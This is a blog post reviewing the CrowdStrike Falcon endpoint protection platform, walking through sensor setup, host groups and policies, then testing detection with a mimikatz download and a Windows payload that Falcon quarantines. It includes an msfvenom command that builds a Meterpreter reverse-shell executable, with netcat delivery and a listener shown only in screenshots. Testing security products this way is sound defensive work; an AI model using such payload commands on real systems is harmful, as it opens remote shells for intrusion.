---
layout: post
title: "Review of Falcon Crowdstrike"
date: 2024-01-07 16:45:59 +0800
---
### What is Falcon Crowdstrike?  
Falcon CrowdStrike is a platform built specifically to stop breaches and prevent attacks of all kinds.  

### Let's dive in  
![sensor-falcon](https://github.com/3xg3lin/3xg3lin.github.io/assets/73038148/835ef1ba-e44e-4f41-b289-4655706f7701)  
First let's set up the sensor...  

And then we check if our sensors are working.  
- On windows

![cmd-query-for-sensors](https://github.com/3xg3lin/3xg3lin.github.io/assets/73038148/e14550ad-8c1c-4ef7-82d0-30ae251450c1)  

- On falcon

![installed-sensor](https://github.com/3xg3lin/3xg3lin.github.io/assets/73038148/32f16834-4981-4c6f-8332-39144eaf7835)  
&&  
![sensorr-check](https://github.com/3xg3lin/3xg3lin.github.io/assets/73038148/c147e84a-a4e2-4e25-aa1a-033bd073b519)  

Now we need to add some policies before we test the falcon.  
For this we must add our computers to a group because the policy will affects all of that group.  

![creation-group](https://github.com/3xg3lin/3xg3lin.github.io/assets/73038148/dbd9970b-57d5-4d27-af53-11ea5606601d)  

From here we can add our computer to a group.  
After that we can make our policy.  

![create-policy](https://github.com/3xg3lin/3xg3lin.github.io/assets/73038148/1cf3d6e7-4f3d-41e0-bc92-d082e6a95aff)  

Now let's try to install [mimikatz.](https://github.com/ParrotSec/mimikatz)  
For this I used git command.  

![installation-mimikatz](https://github.com/3xg3lin/3xg3lin.github.io/assets/73038148/e2dc9a58-558a-4a54-8220-c21314f2ec28)  

And we can see Falcon's notification at the bottom right. And Falcon quarantined this entire file.  

![quarantined-files](https://github.com/3xg3lin/3xg3lin.github.io/assets/73038148/669954f3-379a-4463-b7fc-4082c6459ab1)  

If we look at the endpoint detection pane, it looks like this...  

![crowdstrike-review](https://github.com/3xg3lin/3xg3lin.github.io/assets/73038148/832b4cca-2f5f-42d5-bfbe-87163d0670ae)  

Now let's create reverse shell for windows with mfsvenom.  

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip-addr> LPORT=<port-number> --format exe -o payload.exe
```
![msfvenom-payload](https://github.com/3xg3lin/3xg3lin.github.io/assets/73038148/ac14994d-2eb6-44b3-a226-b5a4b5069789)  

And sending this payload with netcat to windows.  
![netcat-payload](https://github.com/3xg3lin/3xg3lin.github.io/assets/73038148/6ab34893-fa58-4992-bb2e-95d841c7ee50)  

Now we can listen with msfconsole.  
![msfconsole](https://github.com/3xg3lin/3xg3lin.github.io/assets/73038148/99d7fdaf-45ca-4de8-bf80-00783d707072)  

![payload-falcon-result](https://github.com/3xg3lin/3xg3lin.github.io/assets/73038148/a6efbef9-9a42-4ee7-898f-0968ff4823b4)  
When you click the run file, Falcon detects this file and quarantines it.  

